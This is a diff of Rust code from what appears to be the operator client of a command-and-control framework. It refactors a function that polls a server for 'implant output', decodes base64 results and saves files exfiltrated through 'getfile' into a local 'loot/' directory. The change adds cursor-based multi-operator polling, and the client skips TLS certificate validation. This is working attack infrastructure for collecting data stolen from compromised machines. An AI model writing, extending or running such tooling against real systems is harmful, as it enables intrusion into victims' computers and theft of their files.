@@ -14,105 +14,80 @@ use std::{
     io::{Read, Write},
 };
 
-use crate::ImpInfo;
-
+/// Fetches all new implant output since `since_id` (team / multiplayer — server keeps rows, cursor via `X-Output-Max-Id`).
 pub async fn retrieve_all_output_with_polling(
-    imp_info: Vec<ImpInfo>,
     token: &str,
     url: &str,
+    since_id: &mut u32,
 ) -> Result<Vec<String>, Box<dyn Error + Send>> {
+    const CUSTOM_LOOP: engine::GeneralPurpose = engine::GeneralPurpose::new(
+        &alphabet::URL_SAFE,
+        engine::general_purpose::NO_PAD,
+    );
     let mut outputs = Vec::new();
 
-    for imp in imp_info {
-        let session_id = &imp.session; // Assuming ImpInfo has a session field
-        match retrieve_all_output(session_id, token, url).await {
-            Ok(Some(output)) if !output.is_empty() => {
-                let retrieved_output =
-                    engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD)
-                        .decode(output.clone())
-                        .unwrap();
-                let decoded_output = String::from_utf8_lossy(&retrieved_output).to_string();
-                //let output = decoded_output.replace("\n", "");
-                //if output contains the string "getfile", then we need to grab the last string after spaces, which is still base64 encoded and decode it
-                //this works! now I think we will change it to also save the content to a local file - TODONEXT
-                if decoded_output.contains("getfile") {
-                    //grab the still base64 encoded string from the decoded output
-                    let b64output = decoded_output.split_whitespace().last().unwrap();
-                    //decode the base64 encoded string
-                    let retrieved_output =
-                        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD)
-                            .decode(b64output)
-                            .unwrap();
-                    //since we have to return a string, once we have saved the content to a new file, then we can just send a string with the
-                    // file name and the path to the file, and maybe a success message
-                    //first get the file name from the decoded output
-                    //i think the filename is going to be the third word in the decoded output
-                    let fullfilepath = decoded_output.split_whitespace().nth(2).unwrap();
-                    //strip a colon from the beginning of the string
-                    //let fullfilepath = fullfilepath.strip_prefix(":").unwrap();
-                    //print the full file path to the console
-                    //println!("Full file path: {}", fullfilepath);
-                    //we need to get just the filename from the fullfilepath
-                    let filename = fullfilepath.split(r"\").last().unwrap();
-                    //strip the colon from the end of the string
-                    let filename = filename.strip_suffix(":").unwrap();
-                    //now we need to save the file to the local directory
-                    //print the file name to the console
-                    //println!("File name: {}", filename);
-                    //append loot/ to the filename
-                    let filename = "loot/".to_string() + filename;
-                    let fileclone = filename.clone();
-                    let mut file = File::create(filename).unwrap();
-                    file.write_all(&retrieved_output).unwrap();
-                    //now we can add the filename to the outputs vector
-                    //lets push "File saved to: " + filename + " in the outputs vector
-                    let mut file_saved = "File saved to: ".to_string();
-                    file_saved.push_str(fileclone.as_str());
-                    outputs.push(file_saved);
-                    //let b64_decoded_output = String::from_utf8_lossy(&retrieved_output).to_string();
-                    //outputs.push(b64_decoded_output);
-                } else {
-                    outputs.push(decoded_output);
-                    //outputs.push(output),
-                }
-            }
-            Ok(None) => {
-                // Output not available yet, wait and retry
-                // You might want to implement a retry mechanism here
-            }
-            Err(e) => return Err(e),
-            _ => {}
+    let b64 = retrieve_all_output(token, url, since_id).await?;
+    if b64.is_empty() {
+        return Ok(outputs);
+    }
+    let retrieved = CUSTOM_LOOP.decode(b64.trim()).map_err(|e| {
+        Box::new(std::io::Error::new(
+            std::io::ErrorKind::Other,
+            format!("base64: {}", e),
+        )) as Box<dyn Error + Send>
+    })?;
+    let decoded_output = String::from_utf8_lossy(&retrieved).to_string();
+    let decoded_output = decoded_output.trim();
+    if decoded_output == "none" || decoded_output.is_empty() {
+        return Ok(outputs);
+    }
+
+    for line in decoded_output.lines() {
+        if line.is_empty() {
+            continue;
+        }
+        if line.contains("getfile") {
+            let b64output = line.split_whitespace().last().unwrap();
+            let retrieved_output = CUSTOM_LOOP.decode(b64output).map_err(|e| {
+                Box::new(std::io::Error::new(
+                    std::io::ErrorKind::Other,
+                    format!("getfile b64: {}", e),
+                )) as Box<dyn Error + Send>
+            })?;
+            let fullfilepath = line.split_whitespace().nth(2).unwrap();
+            let filename = fullfilepath.split(r"\").last().unwrap();
+            let filename = filename.strip_suffix(":").unwrap();
+            let filename = "loot/".to_string() + filename;
+            let fileclone = filename.clone();
+            let mut file = File::create(filename).unwrap();
+            file.write_all(&retrieved_output).unwrap();
+            let mut file_saved = "File saved to: ".to_string();
+            file_saved.push_str(fileclone.as_str());
+            outputs.push(file_saved);
+        } else {
+            outputs.push(line.to_string());
         }
     }
 
-    //println!("outputs: {:?}", outputs);
-    let outputs: Vec<String> = outputs.iter().map(|s| s.to_string()).collect();
-    //check outputs for presence of double backslashes and replace them with single backslashes
     let outputs: Vec<String> = outputs.iter().map(|s| s.replace(r"\\", r"\")).collect();
-
     Ok(outputs)
 }
 
 pub async fn retrieve_all_output(
-    _session_id: &str,
     token: &str,
     url: &str,
-) -> Result<Option<String>, Box<dyn Error + Send>> {
-    let url = format!("https://{}/retrieve_all_out", url);
-    //println!("task_name: {}", task_name);
-    //println!("imp_token: {}", session_id);
-    //println!("token: {}", token);
-    //println!("url: {}", url);
-
+    since_id: &mut u32,
+) -> Result<String, Box<dyn Error + Send>> {
+    let url = format!("https://{}/retrieve_all_out?since_id={}", url, *since_id);
     let client = ClientBuilder::new()
         .danger_accept_invalid_certs(true)
         .build()
-        .map_err(|_| {
+        .map_err(|e| {
             Box::new(std::io::Error::new(
                 std::io::ErrorKind::Other,
-                "Failed to build the client",
-            ))
-        });
+                format!("Failed to build the client: {}", e),
+            )) as Box<dyn Error + Send>
+        })?;
 
     let mut headers = HeaderMap::new();
     headers.insert(
@@ -120,14 +95,25 @@ pub async fn retrieve_all_output(
         HeaderValue::from_str(token).map_err(|e| Box::new(e) as Box<dyn Error + Send>)?,
     );
 
-    let client = client.map_err(|e| Box::new(e) as Box<dyn Error + Send>)?;
     let res = client.get(&url).headers(headers).send().await;
 
     match res {
         Ok(response) => {
-            let output = response.text().await.unwrap(); // Unwrap the Result to get the inner String value
-                                                         //println!("output: {}", output);
-            Ok(Some(output))
+            let max_id = response
+                .headers()
+                .get("x-output-max-id")
+                .or_else(|| response.headers().get("X-Output-Max-Id"))
+                .and_then(|h| h.to_str().ok())
+                .and_then(|s| s.parse().ok())
+                .unwrap_or(*since_id);
+            *since_id = max_id;
+            let output = response.text().await.map_err(|e| {
+                Box::new(std::io::Error::new(
+                    std::io::ErrorKind::Other,
+                    e.to_string(),
+                )) as Box<dyn Error + Send>
+            })?;
+            Ok(output)
         }
         Err(e) => Err(Box::new(e) as Box<dyn Error + Send>),
     }
